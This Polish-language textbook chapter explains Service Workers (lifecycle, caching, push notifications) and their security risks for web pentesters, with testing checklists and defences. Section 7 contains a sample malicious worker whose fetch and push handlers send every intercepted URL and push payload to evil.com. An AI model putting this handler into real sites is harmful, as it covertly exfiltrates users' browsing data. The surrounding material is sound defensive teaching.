# Rozdział 19: Service Workers

## 1. Czym jest Service Worker

**Service Worker** (SW) to skrypt JavaScript działający w tle przeglądarki, w osobnym wątku od głównej strony, bez dostępu do DOM. Pełni rolę **programistycznego proxy** między stroną a siecią — interceptuje requesty HTTP, zarządza cache'm, obsługuje push notifications i background sync.

Service Worker jest fundamentem **Progressive Web Apps (PWA)** i jednym z najpotężniejszych — ale i najniebezpieczniejszych — mechanizmów webowych. Zarejestrowany SW trwa po zamknięciu strony i może działać w tle nawet gdy użytkownik nie odwiedza aplikacji.

Kluczowe cechy:
- Działa w osobnym wątku (Worker context) — nie ma dostępu do `window` ani DOM
- Interceptuje i może modyfikować/blokować/podmienić dowolny request w swoim scope
- Persystentny — przeżywa zamknięcie karty, wznawia się automatycznie
- Ograniczony do **HTTPS** (poza localhost) — wymóg bezpieczeństwa przeglądarki
- Scoped per origin + path (SW na `/app/` kontroluje tylko requesty do `/app/*`)

---

## 2. Dlaczego powstał

### Problem: brak mechanizmu offline dla stron

Przed Service Workers:
- `AppCache` (HTML5) był pierwszą próbą offline capability — ale działał per-manifest, nie programistycznie
- AppCache był notoriously broken — trudny do debugowania, nieprzewidywalny
- Nie było możliwości interceptowania requestów ani programistycznej kontroli

### AppCache → Service Workers (2014)

AppCache został zdeprecjonowany (usunięty w Chrome 85, 2020). Service Workers zastąpiły go z:
- Pełną programistyczną kontrolą przez JavaScript
- Możliwością interceptowania każdego requestu
- Integracja z Cache API i Background Sync
- Push API — powiadomienia push bez otwartej strony

---

## 3. Jak działa

### Cykl życia Service Worker

```
Rejestracja (strona)
      │
      ▼
  Installing
  (SW script pobierany i parsowany)
      │
      ├─ SUKCES ──► Installed (Waiting)
      │                   │
      │             (stary SW aktywny)
      │                   │
      │             skipWaiting() lub
      │             użytkownik zamknie kartę
      │                   │
      ▼                   ▼
  Activating  ◄──── Installed
      │
      ▼
   Active ──────► [intercepts fetch, push, sync]
      │
      ├─ Update available ──► nowy SW przechodzi przez Installing...
      │
      └─ Unregister ──► Redundant (usunięty)
```

### Rejestracja

```javascript
// W kontekście strony (window)
if ('serviceWorker' in navigator) {
    const registration = await navigator.serviceWorker.register('/sw.js', {
        scope: '/' // kontroluje requesty do tego path i poniżej
    });
    console.log('SW registered:', registration.scope);
}
```

### Interceptowanie requestów (fetch event)

```javascript
// W pliku sw.js (Service Worker context)
self.addEventListener('fetch', (event) => {
    const { request } = event;
    
    // SW może:
    // 1. Zwrócić odpowiedź z cache
    event.respondWith(caches.match(request));
    
    // 2. Zmodyfikować request
    const modified = new Request(request, {
        headers: { ...Object.fromEntries(request.headers), 'X-Custom': 'added-by-sw' }
    });
    event.respondWith(fetch(modified));
    
    // 3. Zablokować request
    event.respondWith(new Response('Blocked', { status: 403 }));
    
    // 4. Przekierować
    event.respondWith(fetch('https://mirror.example.com' + new URL(request.url).pathname));
    
    // 5. Nic nie robić (nie wywołać respondWith) → przeglądarka obsługuje normalnie
});
```

### Install i Activate events

```javascript
const CACHE_NAME = 'app-v3';
const ASSETS = ['/index.html', '/app.js', '/style.css'];

// Install: precache
self.addEventListener('install', (event) => {
    event.waitUntil(
        caches.open(CACHE_NAME)
            .then(cache => cache.addAll(ASSETS))
            .then(() => self.skipWaiting()) // aktywuj bez czekania
    );
});

// Activate: cleanup starych cache
self.addEventListener('activate', (event) => {
    event.waitUntil(
        caches.keys()
            .then(names => Promise.all(
                names.filter(n => n !== CACHE_NAME).map(n => caches.delete(n))
            ))
            .then(() => self.clients.claim()) // przejmij kontrolę nad otwartymi stronami
    );
});
```

### Push i Background Sync

```javascript
// Push notification (bez otwartej strony!)
self.addEventListener('push', (event) => {
    const data = event.data?.json() ?? {};
    event.waitUntil(
        self.registration.showNotification(data.title, {
            body: data.body,
            icon: '/icon.png',
            data: { url: data.url }
        })
    );
});

// Background Sync — wyślij dane gdy sieć wróci
self.addEventListener('sync', (event) => {
    if (event.tag === 'sendMessage') {
        event.waitUntil(syncMessages());
    }
});
```

---

## 4. Co dzieje się wewnętrznie

### Osobny wątek (Worker Thread)

SW działa w dedykowanym wątku renderera. Ma dostęp do:
- `fetch()` — sieciowe requesty
- `caches` — Cache API
- `indexedDB` — IndexedDB
- `crypto` — Web Crypto
- `self.clients` — dostęp do otwartych stron w scope

Nie ma dostępu do:
- `window`, `document`, `navigator` (poza częściowym)
- DOM
- `localStorage` / `sessionStorage`

### Scope

Scope SW jest ograniczony przez **path** pliku SW:
- SW zarejestrowany z `/app/sw.js` → kontroluje requesty do `/app/*`
- SW z `/sw.js` → kontroluje wszystkie requesty na origin

Można zawęzić scope opcją `scope`:
```javascript
navigator.serviceWorker.register('/sw.js', { scope: '/dashboard/' });
```

### Persistent background execution

SW "śpi" gdy nie ma eventów, ale przeglądarki budzą go gdy:
- Strona w scope wykonuje request (fetch event)
- Nadchodzi push notification
- Background Sync trigger
- Periodic Background Sync (Chrome)

---

## 5. Analogiczny przykład z życia

Service Worker to ochroniarz/dispatcher w firmie:

- Stoi przy wejściu (proxy między stroną a siecią)
- Każde wychodzące zamówienie (request) przez niego przechodzi
- Może sprawdzić magazyn (Cache API) i wydać od razu
- Może zablokować lub przekierować zamówienie
- Działa nawet gdy biuro jest zamknięte (strona zamknięta) — odbiera pocztę (push)
- Jest lojalny firmie (origin) a nie konkretnemu pracownikowi (karcie)

---

## 6. Przykład kodu

```javascript
// === sw.js — kompletny Service Worker ===
const CACHE_VERSION = 'v2';
const STATIC_CACHE = `static-${CACHE_VERSION}`;
const DYNAMIC_CACHE = `dynamic-${CACHE_VERSION}`;

const STATIC_ASSETS = ['/', '/index.html', '/app.js', '/style.css', '/offline.html'];

self.addEventListener('install', event => {
    event.waitUntil(
        caches.open(STATIC_CACHE).then(cache => {
            console.log('[SW] Precaching assets');
            return cache.addAll(STATIC_ASSETS);
        }).then(() => self.skipWaiting())
    );
});

self.addEventListener('activate', event => {
    event.waitUntil(
        caches.keys().then(keys =>
            Promise.all(
                keys.filter(k => k !== STATIC_CACHE && k !== DYNAMIC_CACHE)
                    .map(k => caches.delete(k))
            )
        ).then(() => self.clients.claim())
    );
});

self.addEventListener('fetch', event => {
    const { request } = event;
    const url = new URL(request.url);

    // Nie interceptuj chrome-extension, non-GET
    if (url.protocol !== 'https:' || request.method !== 'GET') return;

    // API — network first, fallback cache
    if (url.pathname.startsWith('/api/')) {
        event.respondWith(networkFirstWithCache(request, DYNAMIC_CACHE));
        return;
    }

    // Statyczne zasoby — cache first
    event.respondWith(cacheFirst(request));
});

async function cacheFirst(request) {
    const cached = await caches.match(request);
    if (cached) return cached;
    try {
        const response = await fetch(request);
        const cache = await caches.open(STATIC_CACHE);
        if (response.ok) cache.put(request, response.clone());
        return response;
    } catch {
        return caches.match('/offline.html');
    }
}

async function networkFirstWithCache(request, cacheName) {
    const cache = await caches.open(cacheName);
    try {
        const response = await fetch(request);
        if (response.ok) cache.put(request, response.clone());
        return response;
    } catch {
        return cache.match(request) ?? new Response(
            JSON.stringify({ error: 'offline' }),
            { headers: { 'Content-Type': 'application/json' }, status: 503 }
        );
    }
}
```

---

## 7. Przykład z prawdziwej aplikacji

### Malicious SW jako persystentny backdoor (atak)

Jeśli atakujący zdoła zarejestrować własny Service Worker (przez XSS lub MITM), może uzyskać:

```javascript
// Malicious SW zarejestrowany przez atakującego
// (wymaga XSS lub MITM bez HTTPS)
navigator.serviceWorker.register('https://evil.com/sw.js');
// BŁĄD: SW musi być same-origin! Nie można zarejestrować cross-origin SW.

// Ale MOŻLIWY wektor przez XSS: wstrzyknij lokalny plik jako SW
const blob = new Blob([`
    self.addEventListener('fetch', event => {
        // Interceptuje KAŻDY request
        const url = new URL(event.request.url);
        
        // Eksfiltruj URL i nagłówki
        fetch('https://evil.com/log?url=' + encodeURIComponent(url));
        
        // Serwuj normalnie (ofiara nic nie widzi)
        event.respondWith(fetch(event.request));
    });
    
    // Zbieraj push tokeny
    self.addEventListener('push', event => {
        const data = event.data?.text();
        fetch('https://evil.com/push?d=' + encodeURIComponent(data));
    });
`], { type: 'application/javascript' });

const swUrl = URL.createObjectURL(blob);
// createObjectURL nie działa dla SW (musi być same-origin HTTP URL, nie blob:)
// Ale jeśli atakujący może umieścić plik na tym samym origin...
```

**Realny scenariusz:** XSS pozwala zapisać malicious `sw.js` do IndexedDB lub localStorage, ale bezpośredniej rejestracji cross-origin SW nie ma. Zagrożenie jest realne gdy:
1. Aplikacja pozwala na upload plików JS (hosting user content)
2. Subdomain takeover — `cdn.example.com` przejęty → rejestruje SW dla `cdn.example.com`

### Cache poisoning przez SW

```javascript
// Podatny SW który nie waliduje origin odpowiedzi
self.addEventListener('fetch', event => {
    event.respondWith(
        fetch(event.request).then(async response => {
            // BŁĄD: cache'uje każdą odpowiedź bez sprawdzenia statusu i origin
            const cache = await caches.open('v1');
            cache.put(event.request, response.clone());
            return response;
        })
    );
});
// Jeśli redirect prowadzi na evil.com → evil.com response cache'owany dla app.example.com URL
```

---

## 8. Typowe błędy programistów

### Błąd 1: `skipWaiting()` bez myślenia

```javascript
// PROBLEM: skipWaiting() powoduje że nowy SW przejmuje kontrolę natychmiast
// Stare karty nagle obsługiwane przez nowy SW — może powodować niespójności
self.addEventListener('install', e => {
    e.waitUntil(Promise.resolve().then(() => self.skipWaiting()));
});

// LEPIEJ: poinformuj użytkownika i daj mu wybrać
self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));
// W stronie:
navigator.serviceWorker.addEventListener('controllerchange', () => {
    if (confirm('Dostępna aktualizacja. Przeładować?')) location.reload();
});
```

### Błąd 2: SW na niewłaściwym scope

```javascript
// BŁĄD: SW zarejestrowany z /admin/sw.js może kontrolować /admin/
// ale nie /api/ — requesty do /api/ nie są interceptowane!
navigator.serviceWorker.register('/admin/sw.js');
// fetch('/api/data') → NIE przechodzi przez SW

// POPRAWKA: umieść sw.js w roota jeśli chcesz kontrolować cały origin
navigator.serviceWorker.register('/sw.js'); // scope = '/'
```

### Błąd 3: Fetch event bez respondWith — nieskończona pętla

```javascript
// BŁĄD: SW interceptuje własne requesty → nieskończona pętla
self.addEventListener('fetch', event => {
    event.respondWith(fetch(event.request)); // ten sam request → SW → fetch → SW...
    // (w praktyce przeglądarki mają zabezpieczenia, ale zachowanie jest undefined)
});
```

---

## 9. Znaczenie dla bezpieczeństwa

### SW jako persystentny backdoor

Raz zarejestrowany SW (przez XSS lub MITM):
- Przeżywa zamknięcie strony
- Działa po wylogowaniu (ale nie ma dostępu do cookies/tokens — chyba że je wcześniej skradł)
- Może interceptować WSZYSTKIE requesty w swoim scope
- Może podmienić odpowiedzi serwera na cachowane poisoned wersje

**Usunięcie malicious SW jest trudne:**
- Użytkownik musi manualnie odrejestrować SW przez DevTools
- Albo strona musi wywołać `registration.unregister()`
- Lub przeglądarka wyczyści SW po długim nieużywaniu (Firefox: 30 dni)

### HTTPS requirement

Przeglądarki blokują rejestrację SW poza `localhost` bez HTTPS. To chroni przed:
- MITM podmianą skryptu `sw.js`
- MITM poisoned SW, który modyfikuje requesty

Ale jeśli HTTPS jest skonfigurowane błędnie (expired cert, mixed content) — rejestracja SW się nie powiedzie.

### Subdomain Takeover → SW scope

```
Scenariusz:
1. app.example.com ma SW scope /
2. cdn.example.com (subdomain) jest opuszczony → takeover przez atakującego
3. cdn.example.com ≠ app.example.com (inny origin) → nie może zarejestrować SW dla app
→ Ten atak NIE działa przez SW scope

ALE:
1. static.app.example.com jest subdomeną
2. Aplikacja na app.example.com wykonuje fetch() do static.app.example.com
3. SW na app.example.com NIE kontroluje requestów do innego origin
→ Subdomain takeover wpływa na CORS/content, nie na SW
```

### Powiązane CWE i ataki

- **CWE-494** — Download of Code Without Integrity Check
- **CWE-79** — XSS umożliwiający rejestrację malicious SW
- **Cache Poisoning** — SW cache'uje poisoned responses
- **Man-in-the-Middle** — brak HTTPS pozwala podmienić sw.js

---

## 10. Jak identyfikować podczas pentestu

### DevTools → Application → Service Workers

1. **Application** → **Service Workers**
2. Widoczne są zarejestrowane SW, ich status (installing/waiting/active)
3. Możesz kliknąć URL skryptu → zobacz kod SW
4. **Bypass dla testów:** zaznacz "Bypass for network" — wszystkie requesty idą do sieci
5. **Update on reload** — wymusza reinstalację przy każdym reloadzie

### Sources → Service Workers

- SW kod jest widoczny w zakładce **Sources** → **Service Workers**
- Możesz ustawiać breakpointy w kodzie SW!
- Możesz debugować fetch event, install, activate

### Console w kontekście SW

1. Application → Service Workers → kliknij "inspect" (lub w Sources → SW frame)
2. Console działa w kontekście SW — możesz wykonywać kod bezpośrednio

```javascript
// W kontekście SW (Console po wybraniu SW context):
await caches.keys();         // lista cache'ów
await self.clients.matchAll(); // lista otwartych kart

// Sprawdź co interceptuje fetch
// (nie możesz bezpośrednio wywołać fetch event, ale możesz przeglądać cache)
```

### Szukaj w kodzie SW

```javascript
// Na stronie: znajdź rejestrację SW
navigator.serviceWorker.getRegistrations().then(regs => {
    regs.forEach(reg => {
        console.log('SW:', reg.scope, reg.active?.scriptURL);
    });
});

// Sprawdź czy SW jest aktywny
const reg = await navigator.serviceWorker.getRegistration();
console.log('SW state:', reg?.active?.state);
```

---

## 11. Jak testować bezpieczeństwo

```
□ Czy SW interceptuje requesty z danymi uwierzytelnienia?
□ Czy SW cache'uje odpowiedzi authenticated endpoints?
□ Czy kod SW zawiera hardcoded secrets lub API keys?
□ Czy SW jest dostępny przez HTTPS (nie HTTP)?
□ Czy SW jest wersjonowany i stare wersje są inwalidowane?
□ Czy wylogowanie unregistruje lub czyści SW?
□ Czy scope SW jest zawężony do minimum (nie cały origin)?
□ Czy SW waliduje requesty przed cache'owaniem (status code, origin)?
□ Czy jest możliwość XSS → rejestracja malicious SW?
□ Czy SW obsługuje push — czy token push jest chroniony?
```

---

## 12. Typowe scenariusze ataków

### Scenariusz 1: XSS → malicious SW jako persistent backdoor

**Warunki:** XSS, brak CSP blokującego `worker-src`, możliwość serwowania JS z tego samego origin.

```
1. XSS injection na stronie
2. Payload tworzy malicious sw.js endpoint lub używa istniejącego SW
3. Atakujący modyfikuje SW przez Message API (self.postMessage w SW)
   ALBO: XSS zapisuje payload do IndexedDB/SW cache, który zostaje załadowany przez SW
4. SW przejmuje kontrolę nad wszystkimi requestami
5. Persystuje po zamknięciu karty, restartuje się przy kolejnych wizytach
```

### Scenariusz 2: Cache Poisoning przez open redirect

```
1. Aplikacja ma open redirect: /redirect?url=https://evil.com/fake-app.js
2. SW cache'uje: PUT('/app.js', RESPONSE_FROM_EVIL_COM)
3. Każdy kolejny request do /app.js → SW serwuje poisoned response
4. Usunięcie open redirecta nie usuwa poisoned cache
```

---

## 13. Jak się zabezpieczać

```javascript
// 1. Content Security Policy dla SW
// W nagłówkach HTTP:
// Content-Security-Policy: worker-src 'self'
// Blokuje rejestrację SW z innych origin

// 2. Walidacja origin w SW
self.addEventListener('fetch', event => {
    const url = new URL(event.request.url);
    
    // Tylko same-origin requesty przez cache
    if (url.origin !== self.location.origin) {
        event.respondWith(fetch(event.request));
        return;
    }
    
    event.respondWith(cacheFirst(event.request));
});

// 3. Cache tylko bezpiecznych odpowiedzi
async function safeCacheResponse(request, response) {
    const url = new URL(request.url);
    
    // Nie cache'uj jeśli:
    if (request.method !== 'GET') return; // non-GET
    if (url.pathname.startsWith('/api/user')) return; // auth endpoints
    if (!response.ok) return; // błędy
    if (response.headers.get('Cache-Control')?.includes('no-store')) return;
    
    const cache = await caches.open('app-v1');
    await cache.put(request, response.clone());
}

// 4. Unregister SW przy wylogowaniu
async function logout() {
    const regs = await navigator.serviceWorker.getRegistrations();
    await Promise.all(regs.map(r => r.unregister()));
    const cacheKeys = await caches.keys();
    await Promise.all(cacheKeys.map(k => caches.delete(k)));
    window.location.href = '/login';
}
```

---

## 14. Podsumowanie

**Kluczowe fakty:**

1. Service Worker = skrypt działający w tle, interceptujący requesty między stroną a siecią
2. Działa tylko przez HTTPS (poza localhost) — wymóg bezpieczeństwa przeglądarki
3. Persystentny — przeżywa zamknięcie strony, nie ma dostępu do DOM
4. Kontroluje Cache API — może serwować lub podmienić dowolną odpowiedź
5. Główne zagrożenia: persistent backdoor przez XSS, cache poisoning, subdomain takeover

**Dla pentestera:**
- Application → Service Workers w DevTools — analizuj kod SW
- Sprawdź co SW cache'uje i czy to obejmuje auth endpoints
- Sprawdź czy wylogowanie czyści lub unregistruje SW
- "Bypass for network" w DevTools pozwala pominąć SW podczas testów

---

## Powiązania

```
Service Workers
    │
    ├──► Cache API (Rozdział 18)
    │         Główne narzędzie SW do przechowywania responses
    │
    ├──► IndexedDB (Rozdział 17)
    │         Dostępne w kontekście SW — persistentny storage
    │
    ├──► Web Workers (Rozdział 20)
    │         SW to specjalny typ Worker — bez dostępu do DOM, ale z fetch intercept
    │
    ├──► Push API
    │         SW obsługuje push notifications w tle
    │
    └──► Background Sync API
              SW wykonuje synchronizację gdy sieć dostępna
```
